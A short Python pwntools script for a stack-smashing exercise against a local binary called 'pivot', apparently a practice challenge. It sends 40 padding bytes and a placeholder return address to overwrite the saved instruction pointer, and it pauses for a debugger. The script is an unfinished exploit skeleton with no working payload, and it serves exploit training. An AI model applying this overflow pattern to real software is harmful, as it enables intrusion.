from pwn import	*

# stack offset to overwrite rip
stack_offset = 40

# run target
p = process("./pivot")

# wait for debugger
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

buffer = "A"*stack_offset + p64(0xdeadbeef)

# process interaction
p.recvuntil("Send your second chain now and it will land there")
p.sendline()

p.recvuntil("Now kindly send your stack smash")
p.sendline(buffer)

p.interactive()
